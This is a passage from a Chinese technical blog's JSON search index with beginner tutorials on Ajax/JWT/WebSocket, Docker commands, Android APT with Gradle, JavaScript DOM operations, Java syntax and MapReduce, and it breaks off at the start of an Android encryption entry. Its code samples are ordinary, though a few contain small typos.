欢迎转载！","categories":[{"name":"数据库","slug":"数据库","permalink":"http://www.meng.uno/categories/数据库/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://www.meng.uno/tags/数据库/"},{"name":"NoSQL","slug":"NoSQL","permalink":"http://www.meng.uno/tags/NoSQL/"},{"name":"MongDB","slug":"MongDB","permalink":"http://www.meng.uno/tags/MongDB/"}]},{"title":"前端与后端交互","slug":"ajax","date":"2017-03-09T07:05:06.000Z","updated":"2018-03-09T07:58:03.485Z","comments":true,"path":"articles/7a692555/","link":"","permalink":"http://www.meng.uno/articles/7a692555/","excerpt":"在我们把后台服务化后，前端跨平台化之前，我们还需要了解前台和后台之间怎么通讯。从现有的一些技术上来看，Ajax 和 WebSocket 是比较受欢迎的。 Ajax AJAX 即 “Asynchronous JavaScript And XML”（异步 JavaScript 和 XML），是指一种创建交互式网页应用的网页开发技术。这个功能在之前的很多年来一直被 Web 开发者所忽视，直到最近 Gmail、Google Suggest 和 Google Maps 的出现，才使人们开始意识到其重要性。通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个","text":"在我们把后台服务化后，前端跨平台化之前，我们还需要了解前台和后台之间怎么通讯。从现有的一些技术上来看，Ajax 和 WebSocket 是比较受欢迎的。 Ajax AJAX 即 “Asynchronous JavaScript And XML”（异步 JavaScript 和 XML），是指一种创建交互式网页应用的网页开发技术。这个功能在之前的很多年来一直被 Web 开发者所忽视，直到最近 Gmail、Google Suggest 和 Google Maps 的出现，才使人们开始意识到其重要性。通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。传统的网页如果需要更新内容，必须重载整个网页页面。 Ajax 请求 说起 Ajax，我们就需要用 JavaScript 向服务器发送一个 HTTP 请求。这个过程要从 XMLHttpRequest 开始说起，它是一个 JavaScript 对象。它最初由微软设计，随后被 Mozilla、Apple 和 Google 采纳。如今，该对象已经被 W3C 组织标准化。 如下的所示的是一个 Ajax 请求的示例代码： 12345678 var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() &#123; if (xhr.readyState == XMLHttpRequest.DONE) &#123; alert(xhr.responseText); &#125;&#125;xhr.open('GET', 'http://example.com', true);xhr.send(null); 我们只需要简单的创建一个请求对象实例，打开一个 URL，然后发送这个请求。当传输完毕后，结果的 HTTP 状态以及返回的响应内容也可以从请求对象中获取。 而这个返回的内容可以是多种格式，如 XML 和 JSON，但是从近年的趋势来看，XML 基本上已经很少看到了。这里我们以 JSON 为主，来简单地介绍一下返回数据的解析。 JSON JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。它基于 ECMAScript 的一个子集。 JSON采用完全独立于语言的文本格式，但是也使用了类似于 C 语言家族的习惯（包括 C、C++、C#、Java、JavaScript、Perl、Python等）。这些特性使 JSON 成为理想的数据交换语言。易于人阅读和编写，同时也易于机器解析和生成(一般用于提升网络传输速率)。 XML VS JSON JSON 格式的数据具有以下的一些特点： 容易阅读 解析速度更快 占用空间更少 如下所示的是一个简单的对比过程： 1 myJSON = &#123;&quot;age&quot; : 12, &quot;name&quot; : &quot;Danielle&quot;&#125; 如果我们要取出上面数值中的age，那么我们只需要这样做： 12 anObject = JSON.parse(myJSON);anObject.age === 12 // True 同样的，对于 XML 来说，我们有下面的格式: 1234 &lt;person&gt; &lt;age&gt;12&lt;/age&gt; &lt;name&gt;Danielle&lt;/name&gt;&lt;/person&gt; 而如果我们要取出上面数据中的age的值，他将是这样的： 1234 myObject = parseThatXMLPlease();thePeople = myObject.getChildren(&quot;person&quot;);thePerson = thePeople[0];thePerson.getChildren(&quot;age&quot;)[0].value() == &quot;12&quot; // True 对比一下，我们可以发现XML的数据不仅仅解析上比较麻烦，而且还繁琐。 JSON WEB Tokens JSON Web Token (JWT) 是一种基于 token 的认证方案。 在人们大规模地开始 Web 应用的时候，我们在授权的时候遇到了一些问题，而这些问题不是 Cookie 所能解决的。Cookie 存在一些明显的问题：不能支持跨域、并且不是无状态的、不能使用CDN、与系统耦合等等。除了解决上面的问题，它还可以提高性能等等。基于 Session 的授权机制需要服务端来保存这个状态，而使用 JWT 则可以跳过这个问题，并且使我们设计出来的 API 满足 RESTful 规范。即，我们 API 的状态应该是没有状态的。因此人们提出了 JWT 来解决这一系列的问题。 通过 JWT 我们可以更方便地写出适用于前端应用的认证方案，如登陆、注册这些功能。当我们使用 JWT 来实现我们的注册、登陆功能时，我们在登陆的时候将向我们的服务器发送我们的用户名和密码，服务器验证后将生成对应的 Token。在下次我们进行页面操作的时候，如访问 /Dashboard 时，发出的 HTTP 请求的 Header 中会包含这个 Token。服务器在接收到请求后，将对这个 Token 进行验证并判断这个 Token 是否已经过期了。 JWT 流程 需要注意的一点是：在使用 JWT 的时候也需要注意安全问题，在允许的情况下应该使用 HTTPS 协议。 WebSocket 在一些网站上为了实现推送技术，都采用了轮询的技术。即在特定的的时间间隔里，由浏览器对服务器发出 HTTP 请求，然后浏览器便可以从服务器获取最新的技术。如下图所示的是 Google Chrome 申请开发者账号时发出的对应的请求： Chrome Ajax 轮询 Chrome 的前台正在不断地向后台查询 API 的结果。由于浏览器需要不断的向服务器发出请求，而 HTTP 的 Header 是非常长的，即使是一个很小的数据也会占用大量的带宽和服务器资源。为了解决这个问题，HTML5 推出了一种在单个 TCP 连接上进行全双工通讯的协议WebSocket。 WebSocket 可以让客户端和服务器之间存在持久的连接，而且双方都可以随时开始发送数据。 本文链接： http://www.meng.uno/articles/7a692555/ 欢迎转载！","categories":[{"name":"交互","slug":"交互","permalink":"http://www.meng.uno/categories/交互/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://www.meng.uno/tags/前端/"},{"name":"后端","slug":"后端","permalink":"http://www.meng.uno/tags/后端/"}]},{"title":"Docker的基本使用","slug":"docker-using","date":"2017-03-09T03:17:06.000Z","updated":"2018-03-09T04:06:13.536Z","comments":true,"path":"articles/ca4a993b/","link":"","permalink":"http://www.meng.uno/articles/ca4a993b/","excerpt":"本博文在观看网易蜂巢推出的玩转Docker镜像视频教程之后总结而成。 基本使用 谈到使用Docker，首先，我们必须要了解Dockerfile。（命名为Dockerfile，不要后缀） Dockerfile的解读 首先引入一个例子： 1 2 3 4 5 6 FROM hub.c.163.com/bingohuang/debian:163 MAINTAINER bingohuang RUN apt-get update && apt-get install -y nginx COPY docker-mario /usr/share/nginx/w","text":"本博文在观看网易蜂巢推出的玩转Docker镜像视频教程之后总结而成。 基本使用 谈到使用Docker，首先，我们必须要了解Dockerfile。（命名为Dockerfile，不要后缀） Dockerfile的解读 首先引入一个例子： 123456 FROM hub.c.163.com/bingohuang/debian:163MAINTAINER bingohuang &lt;me@bingohuang.com&gt;RUN apt-get update &amp;&amp; apt-get install -y nginxCOPY docker-mario /usr/share/nginx/wwwEXPOSE 80ENTRYPOINT [\"nginx\", \"-g\", \"daemon off;\"] 逐句解释： 关键字 FROM，选用包含163更新源的Debian镜像，版本7.9 关键字 MAINTAINER，添加作者信息和联系方式（有任何问题或反馈欢迎发邮件沟通） 关键字 RUN，运行命令，这里是更新程序列表并安装 Nginx 程序 关键字 COPY，将 docker-mario 源码拷贝到容器的 /usr/share/nginx/www 目录下（这是第三步安装好 Nginx 程序后自动生成的目录 关键字 EXPOSE，暴露端口，这里是 Nginx 的默认端口：80 关键字 ENTRYPOINT，指定容器运行的默认指令（不会被用户指令覆盖） 构建镜像 1 docker build -t XXX:1.0 . 查看镜像 1 docker images 输出样式： 1 REPOSITORY TAG DIGEST IMAGE ID CREATED SIZE 本地运行 1 docker run --name docker-mario -d -p 1989:80 XXX:1.0 查看运行的镜像： 1 docker ps 访问镜像： 1 open http://127/0/0/1:1989/ 上传镜像 登录网易蜂巢： 1 docker login -u &#123;你的网易云邮箱账号或手机号码&#125; -p &#123;你的网易云密码&#125; hub.c.163.com 标记本地镜像： 1 docker tag &#123;镜像名或ID&#125; hub.c.163.com/&#123;你的用户名&#125;/&#123;标签名&#125; 推送至网易云镜像仓库： 1 docker push hub.c.163.com/&#123;你的用户名&#125;/&#123;标签名&#125; 附一张Docker操作流程图 其他未列出的Docker指令 帮助 1 docker -h 获取镜像 12 sudo docker pull NAME[:TAG]sudo docker pull centos:latest 启动Container盒子 12 sudo docker run [OPTIONS] IMAGE [COMMAND] [ARG...]sudo docker run -t -i contos /bin/bash 查看镜像列表，列出本地的所有images 12 sudo docker images [OPTIONS] [NAME]sudo docker images centos 查看容器列表，可看到我们创建过的所有container 12 sudo docker ps [OPTIONS]sudo docker ps -a 删除镜像，从本地删除一个已经下载的镜像 12 sudo docker rmi IMAGE [IMAGE...]sudo docker rmi centos:latest 移除一个或多个容器实例 1 sudo docker rm [OPTIONS] CONTAINER [CONTAINER...] 移除所有微运行的容器 1 sudo docker rm sudo docker ps -aq 停止一个正在运行的容器 12 sudo docker kill [OPTIONS] CONTAINER [CONTAINNER...]sudo docker kill 026e 重启一个正在运行的容器 12 sudo docker restart [OPTIONS] contains[CONTAINER]sudo docker restart 026e 停止一个已经停止的容器 12 sudo docker start [OPTIONS] CONTAINER [CONTAINER..]sudo docker start 026e 制作镜像 ldd: 打印共享依赖库 123456 ldd redis-3.0.0/src/redis-server linux-vdso.so.1 =&gt; (0x00007fffde365000) libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007f307d5aa000) libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f307d38c000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f307cfc6000) /lib64/ld-linux-x86-64.so.2 (0x00007f307d8b9000) 打包.so文件 1 tar ztvf rootfs.tar.gz ##制成Dockerfile 12345 FROM scratchADD rootfs.tar.gz /COPY redis.conf /etc/redis/redis.confEXPOSE 6379CMD [&quot;redis-server&quot;] 执行构建 1 docker build -t redis . 测试 12345 docker run -d --name redis redisredis-cli -h $(docker inspect -f &apos;&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;&apos; redis)redis-benchmark -h $(docker inspect -f &apos;&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;&apos; redis-05) 本文链接： http://www.meng.uno/articles/ca4a993b/ 欢迎转载！","categories":[{"name":"Docker","slug":"Docker","permalink":"http://www.meng.uno/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://www.meng.uno/tags/Docker/"}]},{"title":"APT相关","slug":"about_APT","date":"2017-03-07T06:32:53.000Z","updated":"2018-03-24T14:39:26.756Z","comments":true,"path":"articles/63b8fab5/","link":"","permalink":"http://www.meng.uno/articles/63b8fab5/","excerpt":"APT: 注解编译工具Annotation Compile Tool,用来在编译时根据注解自动生成Java代码。像ButterKnife,EventBus等库都为了避免因为反射带来的性能损失,都使用了APT注解方式。 使用APT需要的组件 通常一个库有三个以下部分组成： * 核心包 用来对外提供使用,及库的逻辑部分 * Anntation包 用来存放自定义的注解 * Compiler包 这是APT运行所必需的,用来解释注解,告诉APT注解的意思及使用 对与一个使用APT的库来说,Compiler包是必须的.Anntation包有时会包含在核心包里面。 APT Pulgin 虽然J","text":"APT: 注解编译工具Annotation Compile Tool,用来在编译时根据注解自动生成Java代码。像ButterKnife,EventBus等库都为了避免因为反射带来的性能损失,都使用了APT注解方式。 使用APT需要的组件 通常一个库有三个以下部分组成： 核心包 用来对外提供使用,及库的逻辑部分 Anntation包 用来存放自定义的注解 Compiler包 这是APT运行所必需的,用来解释注解,告诉APT注解的意思及使用 对与一个使用APT的库来说,Compiler包是必须的.Anntation包有时会包含在核心包里面。 APT Pulgin 虽然Java提供了APT,但在使用Gradle2.2之前的版本在编译时并不会调用APT,所以通过插件来调用。 这个插件也只能用Javac的方式进行编译。 从Gradle2.2开始,内置了APT的插件,不需要再进行声明,而且还支持以Jack的方式编译。 APT的使用 2.2之前的版本 在工程的Gradle中声明APT插件的依赖 1234 dependencies &#123; classpath 'com.android.tools.build:gradle:2.1.0' classpath 'com.neenbedankt.gradle.plugins:android-apt:1.8' &#125; 在Module的Gradle中声明使用APT插件 1 apply plugin : `android-apt` 在Module的依赖中添加库的依赖.核心包和Compiler包 12345 dependencies &#123; compile fileTree(include: ['*.jar'], dir: 'libs') compile 'com.jakewharton:butterknife:8.5.1' apt 'com.jakewharton:butterknife-compiler:8.5.1'&#125; 任何Module,只要需要使用APT,就必须在Gradle中声明使用APT插件及添加Compiler包的依赖。 2.2之后的版本 工程的Gradle中不需要声明APT插件,除非是库指定. 1234 dependencies &#123; classpath 'com.android.tools.build:gradle:2.3.0' classpath 'com.jakewharton:butterknife-gradle-plugin:8.5.1' &#125; 在项目的Gradle中不需要声明使用的插件,除非是库指定的.如果是个库,则依赖这个库的其它Module都不需要再声明 1 apply plugin: 'com.jakewharton.butterknife' 在Module的Gradle中添加核心包及Compiler包的依赖.Compiler包不再使用APT命令,而是annnotationProcessor 12345 dependencies &#123; compile fileTree(include: ['*.jar'], dir: 'libs') compile 'com.jakewharton:butterknife:8.5.1' annotationProcessor 'com.jakewharton:butterknife-compiler:8.5.1'&#125; 任何Module,只需要使用APT,就必须在Gradle中添加Compiler包的依赖。 本文链接： http://www.meng.uno/articles/63b8fab5/ 欢迎转载！","categories":[{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/categories/Android/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://www.meng.uno/tags/Java/"},{"name":"Android","slug":"Android","permalink":"http://www.meng.uno/tags/Android/"}]},{"title":"JavaScript操作DOM","slug":"js_dom","date":"2017-03-05T08:03:01.000Z","updated":"2018-02-09T10:46:20.926Z","comments":true,"path":"articles/2c47a986/","link":"","permalink":"http://www.meng.uno/articles/2c47a986/","excerpt":"创建节点 除了可以使用createElement创建元素，也可以使用createTextNode创建文本节点。document.body指向的是元素，document.documentElement则指向元素。 1 2 3 4 5 6 //创建节点 var createNode = document.createElement(\"div\"); var createTextNode = document.createTextNode(\"hello world\"); createNode.appendChild(createTextNode);","text":"创建节点 除了可以使用createElement创建元素，也可以使用createTextNode创建文本节点。document.body指向的是&lt;body&gt;元素，document.documentElement则指向&lt;html&gt;元素。 123456 //创建节点 var createNode = document.createElement(\"div\"); var createTextNode = document.createTextNode(\"hello world\"); createNode.appendChild(createTextNode); document.body.appendChild(createNode); document.documentElement.appendChild(createNode); 插入节点 可以使用appendChild，insertBefore，insertBefore接收两个参数，第一个是插入的节点，第二个是参照节点，如insertBefore(a,b)，则a会插入在b的前面 123456 //插入节点 var createNode = document.createElement(\"div\");var createTextNode = document.createTextNode(\"hello world\");createNode.appendChild(createTextNode);var div1 = document.getElementById(\"div1\");document.body.insertBefore(createNode,div1); 替换和删除元素 从replaceChild和removeChild的字面意思看，就是删除子节点，因此调用者，需要包含子节点div1，不然调用会报错。返回的节点是替换的或删除的元素，被替换/删除的元素仍然存在，但document中已经没有他们的位置了。 1234 //替换元素 var replaceChild = document.body.replaceChild(createNode,div1);//删除元素 var removeChild = document.body.removeChild(div1); 节点的属性 firstChild:第一个子节点 lastChild:最后一个子节点 childNodes:子节点集合，获取其中子节点可 someNode.childNodes[index]或 someNode.childNodes.item(index) nextSibling:下一个兄弟节点 previousSibling：上一个兄弟节点 parentNode：父节点 123456 &lt;ul id=\"ul\"&gt;&lt;li&gt;sdsssssss&lt;/li&gt;&lt;li&gt;qqqq&lt;/li&gt;&lt;li&gt;wwww&lt;/li&gt;&lt;li&gt;eeee&lt;/li&gt;&lt;/ul&gt; 12345678910111213141516 //节点属性 var ul = document.getElementById(\"ul\"); var firstChild = ul.firstChild; console.log(firstChild.innerHTML); var lastChild = ul.lastChild; console.log(lastChild.innerHTML); var length = ul.childNodes.length; console.log(length); var secondChild = ul.childNodes.item(1); console.log(secondChild.innerHTML); var forthChild = ul.childNodes.item(2).nextSibling; console.log(forthChild.innerHTML); var thridChild = forthChild.previousSibling; console.log(thridChild.innerHTML); var parentNode = forthChild.parentNode; console.log(parentNode.innerHTML); 文档片段 好处在于减少dom的渲染次数，可以优化性能。 12345678910 //文本片段 var fragment = document.createDocumentFragment(); var ul = document.getElementById(\"ul\"); var li = null; for (var i = 4; i &gt;= 0; i--) &#123; li = document.createElement(\"li\"); li.appendChild(document.createTextNode(\"item \"+i)); fragment.appendChild(li); &#125; ul.appendChild(fragment); 克隆元素 someNode.cloneNode(true):深度克隆，会复制节点及整个子节点 someNode.cloneNode(false):浅克隆，会复制节点，但不复制子节点 123 //克隆var clone = ul.cloneNode(true);document.body.appendChild(clone); 注意： childNodes.length存在跨浏览器的问题 可以看到有关列表的html片段没有用 123456 &lt;ul id=\"ul\"&gt;&lt;li&gt;sdsssssss&lt;/li&gt;&lt;li&gt;qqqq&lt;/li&gt;&lt;li&gt;wwww&lt;/li&gt;&lt;li&gt;eeee&lt;/li&gt;&lt;/ul&gt; 这种书写格式而是使用没有换行的格式书写，是因为在不同的浏览器中，获取ul.childNodes.length的结果有差异： 在ie中，ul.childNodes.length不会计算li之间的换行空格，从而得到数值为4 在ff、chrome,safari中，会有包含li之间的空白符的5个文本节点，因此ul.childNodes.length为9 若要解决跨浏览器问题，可以将li之间的换行去掉，改成一行书写格式。 cloneNode存在跨浏览器的问题 在IE中，通过cloneNode方法复制的元素，会复制事件处理程序，比如，var b = a.cloneNode(true).若a存在click,mouseover等事件监听，则b也会拥有这些事件监听。 在ff,chrome,safari中，通过cloneNode方法复制的元素，只会复制特性，其他一切都不会复制 因此，若要解决跨浏览器问题，在复制前，最好先移除事件处理程序。 本文链接： http://www.meng.uno/articles/2c47a986/ 欢迎转载！","categories":[{"name":"前端","slug":"前端","permalink":"http://www.meng.uno/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://www.meng.uno/tags/前端/"}]},{"title":"Java语法回顾","slug":"java-lang","date":"2017-03-04T13:11:06.000Z","updated":"2018-03-04T13:42:15.585Z","comments":true,"path":"articles/50525a4c/","link":"","permalink":"http://www.meng.uno/articles/50525a4c/","excerpt":"注释 每种语言，第一个教我们的都是“注释”。Java基本有如下三种注释。 1 // 单行注释 1 2 3 /* 多行注释 */ 1 2 3 /** JavaDoc（Java文档）注释是这样的。可以用来描述类和类的属性。 */ 文件头 包 包就像定义文件路径一样，实际上的存储也是按包的名称存储。 1 package uno.meng; 导入类 导入一个类： 1 import java.util.ArrayList; 导入所有类： 1 import java.security.*; 书写类 每个 .java 文件都包含一个public类，这个","text":"注释 每种语言，第一个教我们的都是“注释”。Java基本有如下三种注释。 1 // 单行注释 123 /*多行注释*/ 123 /**JavaDoc（Java文档）注释是这样的。可以用来描述类和类的属性。*/ 文件头 包 包就像定义文件路径一样，实际上的存储也是按包的名称存储。 1 package uno.meng; 导入类 导入一个类： 1 import java.util.ArrayList; 导入所有类： 1 import java.security.*; 书写类 每个 .java 文件都包含一个public类，这个类的名字必须和这个文件名一致。 1 public class LearnJava &#123; 每个程序都需要有一个main函数作为入口： 1 public static void main (String[] args) &#123; 标准输出： 1 System.out.println(\"Hello World!\"); 使用+来拼接字符串： 1234 System.out.println( \"Integer: \" + 10 + \" Double: \" + 3.14 + \" Boolean: \" + true); 如果要在输出后不想自动换行，可以使用System.out.print方法： 12 System.out.print(\"Hello \");System.out.print(\"World\"); 类型与变量 基本类型定义 用 来声明变量： 12345678910 byte fooByte = 100;short fooShort = 10000;int fooInt = 1;long fooLong = 100000L; // L可以用来表示一个数字是长整型的。float fooFloat = 234.5f; // f用来表示一个数字是浮点型的。double fooDouble = 123.4;boolean fooBoolean = true;char fooChar = 'A';final int HOURS_I_WORK_PER_WEEK = 9001; // final 标识常量。String fooString = \"My String Is Here!\"; 数组 数组在声明时大小必须已经确定 数组的声明格式: &lt;数据类型&gt; [] &lt;变量名&gt; = new &lt;数据类型&gt;[&lt;数组大小&gt;]; 123 int [] intArray = new int[10];String [] stringArray = new String[1];boolean [] booleanArray = new boolean[100]; 声明并初始化数组也可以这样: 1 int [] y = &#123;9000, 1000, 1337&#125;; 随机访问数组中的元素: 1 System.out.println(\"intArray @ 0: \" + intArray[0]); 数组下标从0开始并且可以被更改: 12 intArray[1] = 1;System.out.println(\"intArray @ 1: \" + intArray[1]); // =&gt; 1 其他数据类型 ArrayLists - 类似于数组，但是功能更多，并且大小也可以改变，主要有： LinkedLists Maps HashMaps 操作符 多重申明 1 int i1 = 1, i2 = 2; // 多重声明可以简化 算数运算 1234 System.out.println(\"1+2 = \" + (i1 + i2)); // =&gt; 3System.out.println(\"2-1 = \" + (i2 - i1)); // =&gt; 1System.out.println(\"2*1 = \" + (i2 * i1)); // =&gt; 2System.out.println(\"1/2 = \" + (i1 / i2)); // =&gt; 0 (0.5 truncated down) 取余 1 System.out.println(\"11%3 = \"+(11 % 3)); // =&gt; 2 比较操作符 123456 System.out.println(\"3 == 2? \" + (3 == 2)); // =&gt; falseSystem.out.println(\"3 != 2? \" + (3 != 2)); // =&gt; trueSystem.out.println(\"3 &gt; 2? \" + (3 &gt; 2)); // =&gt; trueSystem.out.println(\"3 &lt; 2? \" + (3 &lt; 2)); // =&gt; falseSystem.out.println(\"2 &lt;= 2? \" + (2 &lt;= 2)); // =&gt; trueSystem.out.println(\"2 &gt;= 2? \" + (2 &gt;= 2)); // =&gt; true 位运算操作符 123456789 /*~ 取反，求反码&lt;&lt; 带符号左移&gt;&gt; 带符号右移&gt;&gt;&gt; 无符号右移&amp; 和^ 异或| 相容或*/ 自增 123 int i = 0;System.out.println(\"\\n-&gt;Inc/Dec-rementation\");// ++ 和 -- 操作符使变量加或减1。放在变量前面或者后面的区别是整个表达式的返回值。操作符在前面时，先加减，后取值。操作符在后面时，先取值后加减。 1234 System.out.println(i++); // 后自增 i = 1, 输出0System.out.println(++i); // 前自增 i = 2, 输出2System.out.println(i--); // 后自减 i = 1, 输出2System.out.println(--i); // 前自减 i = 0, 输出0 控制结构 If语句和C的类似 12345678 int j = 10;if (j == 10)&#123; System.out.println(\"I get printed\");&#125; else if (j &gt; 10) &#123; System.out.println(\"I don't\");&#125; else &#123; System.out.println(\"I also don't\");&#125; While循环 123456789 int fooWhile = 0;while(fooWhile &lt; 100)&#123; //System.out.println(fooWhile); //增加计数器 //遍历99次， fooWhile 0-&gt;99 fooWhile++;&#125;System.out.println(\"fooWhile Value: \" + fooWhile); Do While循环 123456789 int fooDoWhile = 0;do&#123; //System.out.println(fooDoWhile); //增加计数器 //遍历99次, fooDoWhile 0-&gt;99 fooDoWhile++;&#125;while(fooDoWhile &lt; 100);System.out.println(\"fooDoWhile Value: \" + fooDoWhile); For 循环 1234567 int fooFor;//for 循环结构 =&gt; for(&lt;起始语句&gt;; &lt;循环进行的条件&gt;; &lt;步长&gt;)for(fooFor=0; fooFor&lt;10; fooFor++)&#123; //System.out.println(fooFor); //遍历 10 次, fooFor 0-&gt;9&#125;System.out.println(\"fooFor Value: \" + fooFor); Switch Case 语句 switch可以用来处理 byte, short, char, 和 int 数据类型，也可以用来处理枚举类型,字符串类,和原始数据类型的包装类：Character, Byte, Short, 和 Integer 1234567891011121314151617 int month = 3;String monthString;switch (month)&#123; case 1: monthString = \"January\"; break; case 2: monthString = \"February\"; break; case 3: monthString = \"March\"; break; default: monthString = \"Some other month\"; break;&#125;System.out.println(\"Switch Case Result: \" + monthString); 类型转换 数据转换 将字符串转换为整型 1 Integer.parseInt(&quot;123&quot;);//返回整数123 将整型转换为字符串 1 Integer.toString(123);//返回字符串&quot;123&quot; 其他的数据也可以进行互相转换: Double Long String 类型转换 你也可以对java对象进行类型转换, 但其中会牵扯到很多概念在这里可以查看更详细的信息: http://docs.oracle.com/javase/tutorial/java/IandI/subclasses.html 方法 用new来实例化一个类 1 Bicycle trek = new Bicycle(); 调用对象的方法 12 trek.speedUp(3); // 需用getter和setter方法trek.setCadence(100); toString 可以把对象转换为字符串 1 System.out.println(&quot;trek info: &quot; + trek.toString()); 你也可以把其他的非public类放入到.java文件中！！ 类定义的语法 1234 &lt;public/private/protected&gt; class &lt;类名&gt;&#123; //成员变量, 构造函数, 函数 //Java中函数被称作方法&#125; 构造方法 构造方法不写返回值，返回类型，必须是public。 以下是一个默认构造函数 123456 public Bicycle() &#123; gear = 1; cadence = 50; speed = 5; name = \"Bontrager\";&#125; 以下是一个含有参数的构造函数 12345 public Bicycle(int startCadence, int startSpeed, int startGear, String name) &#123; this.gear = startGear; this.cadence = startCadence; this.speed = startSpeed; this.name = name; 方法书写语法 &lt;public/private/protected&gt; &lt;返回值类型&gt; &lt;函数名称&gt;(&lt;参数列表&gt;) Java类中经常会用getter和setter来对成员变量进行操作。 类的继承 PennyFarthing 是 Bicycle 的子类 1 class PennyFarthing extends Bicycle &#123; 通过super调用父类的构造函数 123 public PennyFarthing(int startCadence, int startSpeed)&#123; super(startCadence, startSpeed, 0, \"PennyFarthing\");&#125; 你可以用@注释来表示需要重载的方法 123456 @Override public void setGear(int gear) &#123; gear = 0; &#125;&#125; 本文链接： http://www.meng.uno/articles/50525a4c/ 欢迎转载！","categories":[{"name":"Java开发Tips","slug":"Java开发Tips","permalink":"http://www.meng.uno/categories/Java开发Tips/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://www.meng.uno/tags/Java/"},{"name":"Language","slug":"Language","permalink":"http://www.meng.uno/tags/Language/"}]},{"title":"Map Reduce","slug":"mapreduce","date":"2017-03-01T06:36:02.000Z","updated":"2018-03-01T06:50:34.812Z","comments":true,"path":"articles/25d9ef10/","link":"","permalink":"http://www.meng.uno/articles/25d9ef10/","excerpt":"Map Reduce 的意义 集群 在传统的单节点模型中，CPU从内存读取数据，当内存空间不够时，再从磁盘读取数据，当磁盘空间不够了呢？ 即使磁盘空间足够，磁盘带宽是50MB/sec，若从磁盘读取200TB数据，大约需要46+天，完全没法接受呀！ 需要这样一个集群…… 优点（解决困难） 节点故障（node failures） 如果单个服务器能坚持3年（1000天），1000台服务器的集群平均每天大概发生1次故障，1M台服务器的集群平均每天大概发生1000次故障。节点故障时亟须解决的问题： * 如何存储数据，即使节点故障时仍可用？ * 若正在进行大规模计算，如果节点发生故障该如何","text":"Map Reduce 的意义 集群 在传统的单节点模型中，CPU从内存读取数据，当内存空间不够时，再从磁盘读取数据，当磁盘空间不够了呢？ 即使磁盘空间足够，磁盘带宽是50MB/sec，若从磁盘读取200TB数据，大约需要46+天，完全没法接受呀！ 需要这样一个集群…… 优点（解决困难） 节点故障（node failures） 如果单个服务器能坚持3年（1000天），1000台服务器的集群平均每天大概发生1次故障，1M台服务器的集群平均每天大概发生1000次故障。节点故障时亟须解决的问题： 如何存储数据，即使节点故障时仍可用？ 若正在进行大规模计算，如果节点发生故障该如何处理？ Map Reduce在多个节点冗余存储，保证数据持久存储和获取。 网络瓶颈（network bottleneck） Map Reduce的计算靠近数据端，减少数据移动。 分布式程序编写困难 Map Reduce简单的编程模型，隐藏了复杂的细节。 Map Reduce 简介 冗余存储架构 冗余存储架构采用分布式文件系统（distributed file system），例如：Google GFS、Hadoop HDFS。典型的应用是处理大文件，一次存储多次读取追加更新。 数据分块（chuck）存储在多台服务器。如上图所示，一个大文件分割成C0～C5共6块，每块在多台服务器存储备份。每台存储服务器也做计算用，使得计算靠近存储端。 计算模型 123456789 输入：key-value对的集合 - Map(k,v) —&gt; &lt;k’, v’&gt;* - 输入一个key-value对，输出多个key-value对； - 对所有的(k,v)对，只有一个Map函数。- Reduce(k’, &lt;v’&gt;*) —&gt; &lt;k’, v”&gt; - 所有的具有相同k’的v’都被reduce到一起； - 对同一个k’，只有一个Reduce函数。 Map-Reduce的计算模型分为Map和Reduce两步，Map分布式处理任务，Reduce合并任务。 上图展示了用Map-Reduce统计超大规模文件中单词出现次数，红色横线将不同节点的实现分割开。对于Map节点，所有相同单词都输出到同一个节点，比如the都在第二个节点。为了保证效率，Map-Reduce都采用的是顺序读取。 调度与数据流 Map-Reduce的数据流： 输入输出存储在分布式文件系统； 中间结果存储在本地文件系统； 输出通常再输入到另一个Map-Reduce任务。 上图是Map-Reduce分布式系统的并行实现，Partition Function部分采用Hash算法，将相同key的value映射到同一节点。 Map-Reduce环境的主要任务： 分割输入数据； 多机之间程序调度； 执行按key分组操作； 处理节点故障； 处理多机间通信。 Map Reduce的实现分为Master节点、Map节点和Reduce节点，Master节点的任务： 管理每个任务状态：空闲（idle，等待处理）、处理中（in-progress）、completed（结束）； 将空闲任务安排到可用节点； 当Map任务结束，向Master发送其R中间文件（存放在本地文件系统中）的位置和大小，每个reducer一个中间文件； Master推送信息到Reducer； Master周期性ping检测节点是否出故障。 Map Reduce系统有M个Map任务和R个Reduce任务，M比集群中的节点数目大得多，R通常比M小。 Map Reduce 的改进 合并操作 通常在一个Map任务中会产生多个相同key的(k,v)对，在Map节点合并这些相同的key可有效降低网络流量，如上图所示。合并函数通常与Reduce函数相同。 合并时需要注意Reduce函数是否支持在Map节点的合并操作，也就是合并操作会不会改变Reduce的结果。 改写分割函数 例如：系统采用的默认分割函数hash(key) mod R可以改写为hash(hostname(URL)) mod R，使同一个主机的url输出到相同的文件。 本文链接： http://www.meng.uno/articles/25d9ef10/ 欢迎转载！","categories":[{"name":"System","slug":"System","permalink":"http://www.meng.uno/categories/System/"},{"name":"分布式","slug":"System/分布式","permalink":"http://www.meng.uno/categories/System/分布式/"}],"tags":[{"name":"Map","slug":"Map","permalink":"http://www.meng.uno/tags/Map/"},{"name":"Reduce","slug":"Reduce","permalink":"http://www.meng.uno/tags/Reduce/"},{"name":"集群","slug":"集群","permalink":"http://www.meng.uno/tags/集群/"},{"name":"分布式","slug":"分布式","permalink":"http://www.meng.uno/tags/分布式/"}]},{"title":"Android数据加密相关","slug":"data_safety","date":"2017-02-28T10:18:39.000Z","updated":"2018-03-24T14:39:26.757Z","comments":true,"path":"articles/7f8aa6cf/","link":"","permalink":"http://www.meng.uno/articles/7f8aa6cf/","